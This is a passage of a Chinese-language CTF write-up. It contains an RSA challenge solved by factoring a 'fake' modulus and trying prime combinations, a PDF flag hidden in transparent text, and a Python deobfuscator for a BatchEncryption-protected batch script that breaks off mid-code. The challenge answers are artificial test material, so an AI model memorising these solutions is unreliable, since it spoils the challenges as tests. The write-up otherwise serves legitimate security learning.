+<a id="__codelineno-0-25" name="__codelineno-0-25"></a><a href="#__codelineno-0-25"><span class="linenos" data-linenos="25 "></span></a>    <span class="n">really_n</span> <span class="o">=</span> <span class="mi">1</span>
+<a id="__codelineno-0-26" name="__codelineno-0-26"></a><a href="#__codelineno-0-26"><span class="linenos" data-linenos="26 "></span></a>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">fake_n_list</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">):</span>
+<a id="__codelineno-0-27" name="__codelineno-0-27"></a><a href="#__codelineno-0-27"><span class="linenos" data-linenos="27 "></span></a>        <span class="n">really_n</span> <span class="o">*=</span> <span class="n">fake_n_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+<a id="__codelineno-0-28" name="__codelineno-0-28"></a><a href="#__codelineno-0-28"><span class="linenos" data-linenos="28 "></span></a>
+<a id="__codelineno-0-29" name="__codelineno-0-29"></a><a href="#__codelineno-0-29"><span class="linenos" data-linenos="29 "></span></a>    <span class="n">c</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">m</span><span class="p">,</span><span class="n">e</span><span class="p">,</span><span class="n">really_n</span><span class="p">)</span>
+<a id="__codelineno-0-30" name="__codelineno-0-30"></a><a href="#__codelineno-0-30"><span class="linenos" data-linenos="30 "></span></a>
+<a id="__codelineno-0-31" name="__codelineno-0-31"></a><a href="#__codelineno-0-31"><span class="linenos" data-linenos="31 "></span></a>    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;c =&quot;</span><span class="p">,</span><span class="n">c</span><span class="p">)</span>
+<a id="__codelineno-0-32" name="__codelineno-0-32"></a><a href="#__codelineno-0-32"><span class="linenos" data-linenos="32 "></span></a>    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;fake_n =&quot;</span><span class="p">,</span><span class="n">fake_n</span><span class="p">)</span>
+<a id="__codelineno-0-33" name="__codelineno-0-33"></a><a href="#__codelineno-0-33"><span class="linenos" data-linenos="33 "></span></a>
+<a id="__codelineno-0-34" name="__codelineno-0-34"></a><a href="#__codelineno-0-34"><span class="linenos" data-linenos="34 "></span></a><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+<a id="__codelineno-0-35" name="__codelineno-0-35"></a><a href="#__codelineno-0-35"><span class="linenos" data-linenos="35 "></span></a>    <span class="n">m</span> <span class="o">=</span> <span class="n">bytes_to_long</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+<a id="__codelineno-0-36" name="__codelineno-0-36"></a><a href="#__codelineno-0-36"><span class="linenos" data-linenos="36 "></span></a>    <span class="n">e</span> <span class="o">=</span> <span class="mi">65537</span>
+<a id="__codelineno-0-37" name="__codelineno-0-37"></a><a href="#__codelineno-0-37"><span class="linenos" data-linenos="37 "></span></a>    <span class="n">fake_n_list</span> <span class="o">=</span> <span class="n">fakeN_list</span><span class="p">()</span>
+<a id="__codelineno-0-38" name="__codelineno-0-38"></a><a href="#__codelineno-0-38"><span class="linenos" data-linenos="38 "></span></a>    <span class="n">encrypt</span><span class="p">(</span><span class="n">m</span><span class="p">,</span><span class="n">e</span><span class="p">,</span><span class="n">fake_n_list</span><span class="p">)</span>
+<a id="__codelineno-0-39" name="__codelineno-0-39"></a><a href="#__codelineno-0-39"><span class="linenos" data-linenos="39 "></span></a>
+<a id="__codelineno-0-40" name="__codelineno-0-40"></a><a href="#__codelineno-0-40"><span class="linenos" data-linenos="40 "></span></a><span class="sd">&#39;&#39;&#39;</span>
+<a id="__codelineno-0-41" name="__codelineno-0-41"></a><a href="#__codelineno-0-41"><span class="linenos" data-linenos="41 "></span></a><span class="sd">c = 6451324417011540096371899193595274967584961629958072589442231753539333785715373417620914700292158431998640787575661170945478654203892533418902</span>
+<a id="__codelineno-0-42" name="__codelineno-0-42"></a><a href="#__codelineno-0-42"><span class="linenos" data-linenos="42 "></span></a><span class="sd">fake_n = 178981104694777551556050210788105224912858808489844293395656882292972328450647023459180992923023126555636398409062602947287270007964052060975137318172446309766581</span>
+<a id="__codelineno-0-43" name="__codelineno-0-43"></a><a href="#__codelineno-0-43"><span class="linenos" data-linenos="43 "></span></a><span class="sd">&#39;&#39;&#39;</span>
+</code></pre></div>
+<h5 id="_2">解题过程</h5>
+<p>分析题目，可知，fake_n是17个32位的质数的积</p>
+<p>真实的n是其中15个质数</p>
+<p>分解fake_n，得到17个数 [2215221821, 2290486867, 2333428577, 2361589081, 2446301969, 2507934301, 2590663067, 3107210929, 3278987191, 3389689241, 3417707929, 3429664037, 3716624207, 3859354699, 3965529989, 4098704749, 4267348123]</p>
+<p>使用itertools的combinations组合，取15个为一组为n，解密</p>
+<h6 id="exp">exp</h6>
+<div class="language-python highlight"><span class="filename">Python</span><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1"></a><a href="#__codelineno-1-1"><span class="linenos" data-linenos=" 1 "></span></a><span class="kn">import</span> <span class="nn">gmpy2</span><span class="o">,</span><span class="nn">libnum</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2"></a><a href="#__codelineno-1-2"><span class="linenos" data-linenos=" 2 "></span></a><span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">combinations</span>
+<a id="__codelineno-1-3" name="__codelineno-1-3"></a><a href="#__codelineno-1-3"><span class="linenos" data-linenos=" 3 "></span></a>
+<a id="__codelineno-1-4" name="__codelineno-1-4"></a><a href="#__codelineno-1-4"><span class="linenos" data-linenos=" 4 "></span></a><span class="n">nn</span> <span class="o">=</span> <span class="p">[</span><span class="mi">2215221821</span><span class="p">,</span> <span class="mi">2290486867</span><span class="p">,</span> <span class="mi">2333428577</span><span class="p">,</span> <span class="mi">2361589081</span><span class="p">,</span> <span class="mi">2446301969</span><span class="p">,</span> <span class="mi">2507934301</span><span class="p">,</span> <span class="mi">2590663067</span><span class="p">,</span> <span class="mi">3107210929</span><span class="p">,</span> <span class="mi">3278987191</span><span class="p">,</span> <span class="mi">3389689241</span><span class="p">,</span> <span class="mi">3417707929</span><span class="p">,</span> <span class="mi">3429664037</span><span class="p">,</span> <span class="mi">3716624207</span><span class="p">,</span> <span class="mi">3859354699</span><span class="p">,</span> <span class="mi">3965529989</span><span class="p">,</span> <span class="mi">4098704749</span><span class="p">,</span> <span class="mi">4267348123</span><span class="p">]</span>
+<a id="__codelineno-1-5" name="__codelineno-1-5"></a><a href="#__codelineno-1-5"><span class="linenos" data-linenos=" 5 "></span></a><span class="n">e</span> <span class="o">=</span> <span class="mi">65537</span>
+<a id="__codelineno-1-6" name="__codelineno-1-6"></a><a href="#__codelineno-1-6"><span class="linenos" data-linenos=" 6 "></span></a><span class="n">c</span> <span class="o">=</span> <span class="mi">6451324417011540096371899193595274967584961629958072589442231753539333785715373417620914700292158431998640787575661170945478654203892533418902</span>
+<a id="__codelineno-1-7" name="__codelineno-1-7"></a><a href="#__codelineno-1-7"><span class="linenos" data-linenos=" 7 "></span></a>
+<a id="__codelineno-1-8" name="__codelineno-1-8"></a><a href="#__codelineno-1-8"><span class="linenos" data-linenos=" 8 "></span></a><span class="c1"># 生成所有可能的组合</span>
+<a id="__codelineno-1-9" name="__codelineno-1-9"></a><a href="#__codelineno-1-9"><span class="linenos" data-linenos=" 9 "></span></a><span class="n">all_combinations</span> <span class="o">=</span> <span class="p">[]</span>
+<a id="__codelineno-1-10" name="__codelineno-1-10"></a><a href="#__codelineno-1-10"><span class="linenos" data-linenos="10 "></span></a><span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">nn</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
+<a id="__codelineno-1-11" name="__codelineno-1-11"></a><a href="#__codelineno-1-11"><span class="linenos" data-linenos="11 "></span></a>    <span class="n">all_combinations</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">combinations</span><span class="p">(</span><span class="n">nn</span><span class="p">,</span> <span class="n">r</span><span class="p">))</span>
+<a id="__codelineno-1-12" name="__codelineno-1-12"></a><a href="#__codelineno-1-12"><span class="linenos" data-linenos="12 "></span></a>
+<a id="__codelineno-1-13" name="__codelineno-1-13"></a><a href="#__codelineno-1-13"><span class="linenos" data-linenos="13 "></span></a><span class="k">for</span> <span class="n">combination</span> <span class="ow">in</span> <span class="n">all_combinations</span><span class="p">:</span>
+<a id="__codelineno-1-14" name="__codelineno-1-14"></a><a href="#__codelineno-1-14"><span class="linenos" data-linenos="14 "></span></a>    <span class="n">ni</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">combination</span><span class="p">)[:</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span>
+<a id="__codelineno-1-15" name="__codelineno-1-15"></a><a href="#__codelineno-1-15"><span class="linenos" data-linenos="15 "></span></a>    <span class="n">n</span> <span class="o">=</span> <span class="mi">1</span>
+<a id="__codelineno-1-16" name="__codelineno-1-16"></a><a href="#__codelineno-1-16"><span class="linenos" data-linenos="16 "></span></a>    <span class="n">phi</span> <span class="o">=</span> <span class="mi">1</span>
+<a id="__codelineno-1-17" name="__codelineno-1-17"></a><a href="#__codelineno-1-17"><span class="linenos" data-linenos="17 "></span></a>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">ni</span><span class="p">:</span>
+<a id="__codelineno-1-18" name="__codelineno-1-18"></a><a href="#__codelineno-1-18"><span class="linenos" data-linenos="18 "></span></a>        <span class="n">n</span><span class="o">*=</span><span class="n">i</span>
+<a id="__codelineno-1-19" name="__codelineno-1-19"></a><a href="#__codelineno-1-19"><span class="linenos" data-linenos="19 "></span></a>        <span class="n">phi</span><span class="o">*=</span><span class="p">(</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+<a id="__codelineno-1-20" name="__codelineno-1-20"></a><a href="#__codelineno-1-20"><span class="linenos" data-linenos="20 "></span></a>    <span class="n">d</span> <span class="o">=</span> <span class="n">gmpy2</span><span class="o">.</span><span class="n">invert</span><span class="p">(</span><span class="n">e</span><span class="p">,</span><span class="n">phi</span><span class="p">)</span>
+<a id="__codelineno-1-21" name="__codelineno-1-21"></a><a href="#__codelineno-1-21"><span class="linenos" data-linenos="21 "></span></a>    <span class="n">m</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">n</span><span class="p">)</span>
+<a id="__codelineno-1-22" name="__codelineno-1-22"></a><a href="#__codelineno-1-22"><span class="linenos" data-linenos="22 "></span></a>    <span class="n">m_s</span> <span class="o">=</span> <span class="n">libnum</span><span class="o">.</span><span class="n">n2s</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">m</span><span class="p">))</span>
+<a id="__codelineno-1-23" name="__codelineno-1-23"></a><a href="#__codelineno-1-23"><span class="linenos" data-linenos="23 "></span></a>    <span class="k">if</span> <span class="s2">&quot;begin{&quot;</span> <span class="ow">in</span>  <span class="nb">str</span><span class="p">(</span><span class="n">m_s</span><span class="p">):</span>
+<a id="__codelineno-1-24" name="__codelineno-1-24"></a><a href="#__codelineno-1-24"><span class="linenos" data-linenos="24 "></span></a>        <span class="nb">print</span><span class="p">(</span><span class="n">m_s</span><span class="p">)</span>
+<a id="__codelineno-1-25" name="__codelineno-1-25"></a><a href="#__codelineno-1-25"><span class="linenos" data-linenos="25 "></span></a>        <span class="n">exit</span><span class="p">()</span>
+</code></pre></div>
+<h2 id="forensics">Forensics</h2>
+<h3 id="reverse">逆向工程(reverse)入门指南</h3>
+<h5 id="_3">解题过程</h5>
+<p>题目是一个pdf，是逆向工程(reverse)入门指南</p>
+<p>浏览器打开，ctrl+a 选中一段透明字符，ctrl+c复制，粘贴，获得flag</p>
+<hr />
+<p>指南很好，看了会儿。看完拿flag，到平台看，已经有二三十个队伍提交了flag😭</p>
+<h3 id="beginner_forensics">beginner_Forensics!!!!</h3>
+<p>对于取证初学者来说,他们或许会遇到一些混淆的代码.而你需要学会如何去解决他们?请发挥你的想法,拿到隐藏于其的秘密! 🦇</p>
+<h5 id="_4">解题过程</h5>
+<p>题目文本形式打开
+发现字符串“::BatchEncryption Build 201610 By <a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#103;&#119;&#115;&#98;&#104;&#113;&#116;&#64;&#49;&#54;&#51;&#46;&#99;&#111;&#109;">&#103;&#119;&#115;&#98;&#104;&#113;&#116;&#64;&#49;&#54;&#51;&#46;&#99;&#111;&#109;</a>”
+搜索，发现强国杯2022的一个题目，
+根据writeup，知道这是加密方式为batchencryption的bat脚本，
+使用脚本解密
+<div class="language-python highlight"><span class="filename">Python</span><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1"></a><a href="#__codelineno-2-1"><span class="linenos" data-linenos="  1 "></span></a><span class="ch">#!/usr/bin/python</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2"></a><a href="#__codelineno-2-2"><span class="linenos" data-linenos="  2 "></span></a><span class="c1"># -*- coding: UTF-8 -*-</span>
+<a id="__codelineno-2-3" name="__codelineno-2-3"></a><a href="#__codelineno-2-3"><span class="linenos" data-linenos="  3 "></span></a><span class="kn">import</span> <span class="nn">os</span>
+<a id="__codelineno-2-4" name="__codelineno-2-4"></a><a href="#__codelineno-2-4"><span class="linenos" data-linenos="  4 "></span></a><span class="kn">import</span> <span class="nn">sys</span>
+<a id="__codelineno-2-5" name="__codelineno-2-5"></a><a href="#__codelineno-2-5"><span class="linenos" data-linenos="  5 "></span></a><span class="n">envars</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">()</span>
+<a id="__codelineno-2-6" name="__codelineno-2-6"></a><a href="#__codelineno-2-6"><span class="linenos" data-linenos="  6 "></span></a>
+<a id="__codelineno-2-7" name="__codelineno-2-7"></a><a href="#__codelineno-2-7"><span class="linenos" data-linenos="  7 "></span></a><span class="k">def</span> <span class="nf">readVarvalue</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+<a id="__codelineno-2-8" name="__codelineno-2-8"></a><a href="#__codelineno-2-8"><span class="linenos" data-linenos="  8 "></span></a>    <span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<a id="__codelineno-2-9" name="__codelineno-2-9"></a><a href="#__codelineno-2-9"><span class="linenos" data-linenos="  9 "></span></a>    <span class="n">source</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s2">&quot;utf-8&quot;</span><span class="p">)</span>
+<a id="__codelineno-2-10" name="__codelineno-2-10"></a><a href="#__codelineno-2-10"><span class="linenos" data-linenos=" 10 "></span></a>    <span class="n">buffer</span> <span class="o">=</span> <span class="n">source</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="n">length</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span>
+<a id="__codelineno-2-11" name="__codelineno-2-11"></a><a href="#__codelineno-2-11"><span class="linenos" data-linenos=" 11 "></span></a>    <span class="n">buffer</span> <span class="o">=</span> <span class="n">buffer</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;:~&quot;</span><span class="p">)</span>
+<a id="__codelineno-2-12" name="__codelineno-2-12"></a><a href="#__codelineno-2-12"><span class="linenos" data-linenos=" 12 "></span></a>
+<a id="__codelineno-2-13" name="__codelineno-2-13"></a><a href="#__codelineno-2-13"><span class="linenos" data-linenos=" 13 "></span></a>    <span class="n">varname</span> <span class="o">=</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+<a id="__codelineno-2-14" name="__codelineno-2-14"></a><a href="#__codelineno-2-14"><span class="linenos" data-linenos=" 14 "></span></a>    <span class="k">if</span> <span class="ow">not</span> <span class="n">varname</span> <span class="ow">in</span> <span class="n">envars</span><span class="p">:</span>
+<a id="__codelineno-2-15" name="__codelineno-2-15"></a><a href="#__codelineno-2-15"><span class="linenos" data-linenos=" 15 "></span></a>        <span class="n">envars</span><span class="p">[</span><span class="n">varname</span><span class="p">]</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="n">varname</span><span class="p">)</span>
+<a id="__codelineno-2-16" name="__codelineno-2-16"></a><a href="#__codelineno-2-16"><span class="linenos" data-linenos=" 16 "></span></a>
+<a id="__codelineno-2-17" name="__codelineno-2-17"></a><a href="#__codelineno-2-17"><span class="linenos" data-linenos=" 17 "></span></a>    <span class="n">entity</span> <span class="o">=</span> <span class="n">envars</span><span class="p">[</span><span class="n">varname</span><span class="p">]</span>
+<a id="__codelineno-2-18" name="__codelineno-2-18"></a><a href="#__codelineno-2-18"><span class="linenos" data-linenos=" 18 "></span></a>    <span class="k">if</span> <span class="ow">not</span> <span class="n">entity</span><span class="p">:</span>  <span class="c1"># None value</span>
+<a id="__codelineno-2-19" name="__codelineno-2-19"></a><a href="#__codelineno-2-19"><span class="linenos" data-linenos=" 19 "></span></a>        <span class="k">return</span> <span class="n">source</span>
+<a id="__codelineno-2-20" name="__codelineno-2-20"></a><a href="#__codelineno-2-20"><span class="linenos" data-linenos=" 20 "></span></a>
+<a id="__codelineno-2-21" name="__codelineno-2-21"></a><a href="#__codelineno-2-21"><span class="linenos" data-linenos=" 21 "></span></a>    <span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span>
+<a id="__codelineno-2-22" name="__codelineno-2-22"></a><a href="#__codelineno-2-22"><span class="linenos" data-linenos=" 22 "></span></a>    <span class="k">if</span> <span class="n">length</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
+<a id="__codelineno-2-23" name="__codelineno-2-23"></a><a href="#__codelineno-2-23"><span class="linenos" data-linenos=" 23 "></span></a>        <span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">entity</span><span class="p">)</span>
+<a id="__codelineno-2-24" name="__codelineno-2-24"></a><a href="#__codelineno-2-24"><span class="linenos" data-linenos=" 24 "></span></a>        <span class="n">buffer</span> <span class="o">=</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;,&quot;</span><span class="p">)</span>
+<a id="__codelineno-2-25" name="__codelineno-2-25"></a><a href="#__codelineno-2-25"><span class="linenos" data-linenos=" 25 "></span></a>        <span class="n">start</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">buffer</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+<a id="__codelineno-2-26" name="__codelineno-2-26"></a><a href="#__codelineno-2-26"><span class="linenos" data-linenos=" 26 "></span></a>        <span class="n">ended</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">buffer</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+<a id="__codelineno-2-27" name="__codelineno-2-27"></a><a href="#__codelineno-2-27"><span class="linenos" data-linenos=" 27 "></span></a>        <span class="k">if</span> <span class="n">start</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
+<a id="__codelineno-2-28" name="__codelineno-2-28"></a><a href="#__codelineno-2-28"><span class="linenos" data-linenos=" 28 "></span></a>            <span class="n">start</span><span class="p">,</span> <span class="n">ended</span> <span class="o">=</span> <span class="n">length</span> <span class="o">+</span> <span class="n">start</span><span class="p">,</span> <span class="n">ended</span>
+<a id="__codelineno-2-29" name="__codelineno-2-29"></a><a href="#__codelineno-2-29"><span class="linenos" data-linenos=" 29 "></span></a>        <span class="n">source</span> <span class="o">=</span> <span class="n">entity</span><span class="p">[</span><span class="n">start</span><span class="p">:</span> <span class="n">start</span> <span class="o">+</span> <span class="n">ended</span><span class="p">]</span>
+<a id="__codelineno-2-30" name="__codelineno-2-30"></a><a href="#__codelineno-2-30"><span class="linenos" data-linenos=" 30 "></span></a>    <span class="k">return</span> <span class="n">source</span>
+<a id="__codelineno-2-31" name="__codelineno-2-31"></a><a href="#__codelineno-2-31"><span class="linenos" data-linenos=" 31 "></span></a>
+<a id="__codelineno-2-32" name="__codelineno-2-32"></a><a href="#__codelineno-2-32"><span class="linenos" data-linenos=" 32 "></span></a>
+<a id="__codelineno-2-33" name="__codelineno-2-33"></a><a href="#__codelineno-2-33"><span class="linenos" data-linenos=" 33 "></span></a><span class="k">def</span> <span class="nf">batchReader</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">index</span><span class="p">,</span> <span class="n">length</span><span class="p">):</span>
+<a id="__codelineno-2-34" name="__codelineno-2-34"></a><a href="#__codelineno-2-34"><span class="linenos" data-linenos=" 34 "></span></a>    <span class="n">buffer</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">();</span> <span class="n">source</span> <span class="o">=</span> <span class="nb">str</span><span class="p">()</span>
+<a id="__codelineno-2-35" name="__codelineno-2-35"></a><a href="#__codelineno-2-35"><span class="linenos" data-linenos=" 35 "></span></a>
+<a id="__codelineno-2-36" name="__codelineno-2-36"></a><a href="#__codelineno-2-36"><span class="linenos" data-linenos=" 36 "></span></a>    <span class="n">flag</span> <span class="o">=</span> <span class="kc">False</span><span class="p">;</span> <span class="n">start</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">ended</span> <span class="o">=</span> <span class="mi">0</span>
+<a id="__codelineno-2-37" name="__codelineno-2-37"></a><a href="#__codelineno-2-37"><span class="linenos" data-linenos=" 37 "></span></a>    <span class="k">while</span><span class="p">(</span><span class="kc">True</span><span class="p">):</span>
+<a id="__codelineno-2-38" name="__codelineno-2-38"></a><a href="#__codelineno-2-38"><span class="linenos" data-linenos=" 38 "></span></a>        <span class="k">if</span> <span class="n">data</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="ow">in</span> <span class="p">[</span><span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0xFE</span><span class="p">]:</span> <span class="n">index</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span> <span class="k">continue</span>
+<a id="__codelineno-2-39" name="__codelineno-2-39"></a><a href="#__codelineno-2-39"><span class="linenos" data-linenos=" 39 "></span></a>        <span class="k">if</span> <span class="n">data</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x0D</span> <span class="ow">and</span> <span class="n">data</span><span class="p">[</span><span class="n">index</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x0A</span><span class="p">:</span> <span class="n">index</span> <span class="o">+=</span> <span class="mi">2</span><span class="p">;</span> <span class="k">break</span>
+<a id="__codelineno-2-40" name="__codelineno-2-40"></a><a href="#__codelineno-2-40"><span class="linenos" data-linenos=" 40 "></span></a>        <span class="k">if</span> <span class="n">data</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">==</span> <span class="mh">0x25</span><span class="p">:</span> <span class="c1"># 判断变量符号, 获取符号名</span>
+<a id="__codelineno-2-41" name="__codelineno-2-41"></a><a href="#__codelineno-2-41"><span class="linenos" data-linenos=" 41 "></span></a>            <span class="k">if</span> <span class="ow">not</span> <span class="n">flag</span><span class="p">:</span>
+<a id="__codelineno-2-42" name="__codelineno-2-42"></a><a href="#__codelineno-2-42"><span class="linenos" data-linenos=" 42 "></span></a>                <span class="n">flag</span> <span class="o">=</span> <span class="kc">True</span>
+<a id="__codelineno-2-43" name="__codelineno-2-43"></a><a href="#__codelineno-2-43"><span class="linenos" data-linenos=" 43 "></span></a>                <span class="n">start</span> <span class="o">=</span> <span class="n">index</span>
+<a id="__codelineno-2-44" name="__codelineno-2-44"></a><a href="#__codelineno-2-44"><span class="linenos" data-linenos=" 44 "></span></a>            <span class="k">else</span><span class="p">:</span>
+<a id="__codelineno-2-45" name="__codelineno-2-45"></a><a href="#__codelineno-2-45"><span class="linenos" data-linenos=" 45 "></span></a>                <span class="n">flag</span> <span class="o">=</span> <span class="kc">False</span>
+<a id="__codelineno-2-46" name="__codelineno-2-46"></a><a href="#__codelineno-2-46"><span class="linenos" data-linenos=" 46 "></span></a>                <span class="n">ended</span> <span class="o">=</span> <span class="n">index</span> <span class="o">+</span> <span class="mi">1</span>
+<a id="__codelineno-2-47" name="__codelineno-2-47"></a><a href="#__codelineno-2-47"><span class="linenos" data-linenos=" 47 "></span></a>                <span class="n">buffer</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">start</span><span class="p">:</span><span class="n">ended</span><span class="p">]</span>
+<a id="__codelineno-2-48" name="__codelineno-2-48"></a><a href="#__codelineno-2-48"><span class="linenos" data-linenos=" 48 "></span></a>                <span class="n">source</span> <span class="o">+=</span> <span class="n">readVarvalue</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span>
+<a id="__codelineno-2-49" name="__codelineno-2-49"></a><a href="#__codelineno-2-49"><span class="linenos" data-linenos=" 49 "></span></a>            <span class="n">index</span> <span class="o">+=</span> <span class="mi">1</span>
+<a id="__codelineno-2-50" name="__codelineno-2-50"></a><a href="#__codelineno-2-50"><span class="linenos" data-linenos=" 50 "></span></a>        <span class="k">else</span><span class="p">:</span>
+<a id="__codelineno-2-51" name="__codelineno-2-51"></a><a href="#__codelineno-2-51"><span class="linenos" data-linenos=" 51 "></span></a>            <span class="k">if</span> <span class="ow">not</span> <span class="n">flag</span><span class="p">:</span> <span class="c1"># 保存其他字符串</span>
+<a id="__codelineno-2-52" name="__codelineno-2-52"></a><a href="#__codelineno-2-52"><span class="linenos" data-linenos=" 52 "></span></a>                <span class="k">try</span><span class="p">:</span>
+<a id="__codelineno-2-53" name="__codelineno-2-53"></a><a href="#__codelineno-2-53"><span class="linenos" data-linenos=" 53 "></span></a>                    <span class="n">buffer</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">index</span><span class="p">:</span><span class="n">index</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span>
+<a id="__codelineno-2-54" name="__codelineno-2-54"></a><a href="#__codelineno-2-54"><span class="linenos" data-linenos=" 54 "></span></a>                    <span class="n">source</span> <span class="o">+=</span> <span class="nb">str</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s2">&quot;utf-8&quot;</span><span class="p">)</span>
+<a id="__codelineno-2-55" name="__codelineno-2-55"></a><a href="#__codelineno-2-55"><span class="linenos" data-linenos=" 55 "></span></a>                    <span class="n">index</span> <span class="o">+=</span> <span class="mi">1</span>
+<a id="__codelineno-2-56" name="__codelineno-2-56"></a><a href="#__codelineno-2-56"><span class="linenos" data-linenos=" 56 "></span></a>                <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
+<a id="__codelineno-2-57" name="__codelineno-2-57"></a><a href="#__codelineno-2-57"><span class="linenos" data-linenos=" 57 "></span></a>                    <span class="n">ansiByte</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">();</span> <span class="n">ansiLen</span> <span class="o">=</span> <span class="n">index</span>
+<a id="__codelineno-2-58" name="__codelineno-2-58"></a><a href="#__codelineno-2-58"><span class="linenos" data-linenos=" 58 "></span></a>                    <span class="k">while</span> <span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&quot;x&quot;</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">):</span>
+<a id="__codelineno-2-59" name="__codelineno-2-59"></a><a href="#__codelineno-2-59"><span class="linenos" data-linenos=" 59 "></span></a>                        <span class="n">ansiByte</span> <span class="o">+=</span> <span class="n">buffer</span><span class="p">;</span> <span class="n">ansiLen</span> <span class="o">+=</span> <span class="mi">1</span>
+<a id="__codelineno-2-60" name="__codelineno-2-60"></a><a href="#__codelineno-2-60"><span class="linenos" data-linenos=" 60 "></span></a>                        <span class="n">buffer</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">ansiLen</span><span class="p">:</span><span class="n">ansiLen</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span>
+<a id="__codelineno-2-61" name="__codelineno-2-61"></a><a href="#__codelineno-2-61"><span class="linenos" data-linenos=" 61 "></span></a>                    <span class="n">source</span> <span class="o">+=</span> <span class="n">ansiByte</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&quot;ansi&quot;</span><span class="p">,</span> <span class="s2">&quot;ignore&quot;</span><span class="p">)</span>
+<a id="__codelineno-2-62" name="__codelineno-2-62"></a><a href="#__codelineno-2-62"><span class="linenos" data-linenos=" 62 "></span></a>                    <span class="n">index</span> <span class="o">=</span> <span class="n">ansiLen</span>
+<a id="__codelineno-2-63" name="__codelineno-2-63"></a><a href="#__codelineno-2-63"><span class="linenos" data-linenos=" 63 "></span></a>            <span class="k">else</span><span class="p">:</span> <span class="c1"># 保存变量内的名称</span>
